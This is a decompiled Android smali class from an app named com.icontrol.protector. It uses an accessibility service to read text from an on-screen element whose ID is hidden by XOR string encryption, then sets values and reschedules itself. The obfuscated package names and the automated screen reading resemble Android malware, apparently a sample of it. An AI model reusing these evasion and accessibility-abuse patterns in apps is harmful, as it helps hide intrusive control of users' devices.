.class Lcom/icontrol/protector/m$i$a$b;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/m$i$a;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lcom/icontrol/protector/m$i$a;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/m$i$a;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/m$i$a$b;->e:Lcom/icontrol/protector/m$i$a;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/16 v1, 0x34

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-static {}, Lcom/icontrol/protector/m;->g0()Ljava/util/List;

    move-result-object v1

    const/4 v3, 0x4

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_1

    const/4 v4, 0x0

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    sget-object v4, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    invoke-virtual {v0, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    invoke-static {v1}, Lcom/icontrol/protector/m;->h0(Ljava/util/List;)V

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    new-array v0, v3, [B

    fill-array-data v0, :array_2

    new-array v1, v2, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/m;->C:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/m;->j0()V

    goto :goto_1

    :cond_1
    invoke-static {v1}, Lcom/icontrol/protector/m;->h0(Ljava/util/List;)V

    new-array v0, v3, [B

    fill-array-data v0, :array_4

    new-array v1, v2, [B

    fill-array-data v1, :array_5

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/m;->C:Ljava/lang/String;

    :goto_0
    invoke-static {}, Lcom/icontrol/protector/m;->i0()V

    :cond_2
    :goto_1
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/icontrol/protector/m$i$a$b$a;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/m$i$a$b$a;-><init>(Lcom/icontrol/protector/m$i$a$b;)V

    const-wide/16 v2, 0x29a

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :array_0
    .array-data 1
        -0x3bt
        -0x13t
        0x32t
        0x2ft
        -0x4et
        0x18t
        0x13t
        0x13t
        -0x37t
        -0x15t
        0x3bt
        0x2ft
        -0x41t
        0x17t
        0x2t
        0xft
        -0x3bt
        -0x16t
        0x3at
        0x73t
        -0x17t
        0x1ft
        0x13t
        0x4et
        -0x37t
        -0xet
        0x33t
        0x74t
        -0x60t
        0x29t
        0x3t
        0x0t
        -0x2bt
        -0x17t
        0x0t
        0x69t
        -0x4at
        0x17t
        0x13t
        0x4t
        -0x2ct
        -0x23t
        0x2bt
        0x68t
        -0x59t
        0x1at
        0x12t
        0x3et
        -0x30t
        -0x15t
        0x3at
        0x76t
    .end array-data

    :array_1
    .array-data 1
        -0x5at
        -0x7et
        0x5ft
        0x1t
        -0x2dt
        0x76t
        0x77t
        0x61t
    .end array-data

    :array_2
    .array-data 1
        0x30t
        -0x7et
        -0x4et
        -0x58t
    .end array-data

    :array_3
    .array-data 1
        0x3t
        -0x49t
        -0x7et
        -0x68t
        0x75t
        -0x58t
        -0x67t
        -0x7ct
    .end array-data

    :array_4
    .array-data 1
        0x1ft
        0x20t
        0x69t
        0x7at
    .end array-data

    :array_5
    .array-data 1
        0x2ct
        0x15t
        0x59t
        0x4at
        -0x4ct
        0x6bt
        0x59t
        -0x29t
    .end array-data
.end method
